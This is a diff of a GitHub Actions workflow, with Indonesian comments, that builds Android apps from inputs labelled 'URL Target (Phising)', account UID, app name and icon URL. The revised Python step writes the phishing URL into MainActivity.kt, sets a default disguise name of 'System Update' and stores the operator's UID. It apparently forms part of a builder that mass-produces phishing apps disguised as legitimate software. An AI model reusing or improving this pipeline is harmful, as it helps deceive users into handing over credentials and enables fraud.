@@ -10,7 +10,7 @@ on:
       target_url:
         description: 'URL Target (Phising)'
         required: true
-        default: 'https://example.com'
+        default: 'https://google.com'
       uid:
         description: 'UID Akun'
         required: true
@@ -45,36 +45,60 @@ jobs:
       - name: Install Pillow
         run: pip install Pillow
 
-      - name: Inject Config (Nama, URL, UID, Label)
+      - name: Inject Config (Python)
+        env:
+          TARGET_URL: ${{ github.event.inputs.target_url }}
+          APP_NAME: ${{ github.event.inputs.app_name }}
+          ACCOUNT_UID: ${{ github.event.inputs.uid }}
         run: |
-          set -e
+          python3 - << 'EOF'
+          import os
+          import json
+          import re
 
-          # 1. app_name di strings.xml
-          sed -i 's|<string name="app_name">.*</string>|<string name="app_name">${{ github.event.inputs.app_name }}</string>|g' \
-            android/app/src/main/res/values/strings.xml
+          # ─── 1. REPLACE TARGET_URL ───
+          main_kt = "android/app/src/main/java/com/sync/xxx/MainActivity.kt"
+          with open(main_kt, "r") as f:
+              content = f.read()
 
-          # 2. TARGET_URL di MainActivity.kt (Pakai delimiter | biar aman sama karakter URL)
-          sed -i 's|"TARGET_URL_PLACEHOLDER"|"${{ github.event.inputs.target_url }}"|g' \
-            android/app/src/main/java/com/sync/xxx/MainActivity.kt
+          url_input = os.environ.get("TARGET_URL", "https://google.com")
+          content = content.replace('"TARGET_URL_PLACEHOLDER"', f'"{url_input}"')
 
-          # 3. Ganti semua label hardcoded di AndroidManifest
-          sed -i "s|android:label=\"Mario Song\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" \
-            android/app/src/main/AndroidManifest.xml
+          with open(main_kt, "w") as f:
+              f.write(content)
+          print(f"✅ TARGET_URL injected: {url_input}")
 
-          # 4. Asset UID
-          mkdir -p android/app/src/main/assets/
-          echo '{"uid":"${{ github.event.inputs.uid }}"}' > android/app/src/main/assets/uid.json
+          # ─── 2. REPLACE APP NAME ───
+          strings_xml = "android/app/src/main/res/values/strings.xml"
+          with open(strings_xml, "r") as f:
+              content = f.read()
 
-          # 5. Download icon
+          app_name = os.environ.get("APP_NAME", "System Update")
+          content = re.sub(r'<string name="app_name">.*?</string>', f'<string name="app_name">{app_name}</string>', content)
+
+          with open(strings_xml, "w") as f:
+              f.write(content)
+          print(f"✅ APP_NAME injected: {app_name}")
+
+          # ─── 3. CREATE UID.JSON ───
+          os.makedirs("android/app/src/main/assets", exist_ok=True)
+          uid = os.environ.get("ACCOUNT_UID", "nexsus-xxxxxxx")
+          with open("android/app/src/main/assets/uid.json", "w") as f:
+              json.dump({"uid": uid}, f)
+          print(f"✅ UID injected: {uid}")
+
+          # ─── 4. VERIFY ───
+          print("\n=== VERIFIKASI ===")
+          with open(main_kt, "r") as f:
+              for line in f:
+                  if "TARGET_URL" in line and "private val" in line:
+                      print(f"MainActivity.kt: {line.strip()}")
+          print("==================\n")
+          EOF
+
+      - name: Download Icon
+        run: |
           curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"
-
-          # 6. Verify inject berhasil
-          echo "=== strings.xml ==="
-          grep app_name android/app/src/main/res/values/strings.xml || true
-          echo "=== MainActivity TARGET_URL ==="
-          grep 'private val TARGET_URL' android/app/src/main/java/com/sync/xxx/MainActivity.kt || true
-          echo "=== uid.json ==="
-          cat android/app/src/main/assets/uid.json
 
       - name: Generate App Icons
         run: python3 generate_icons.py custom_icon.png
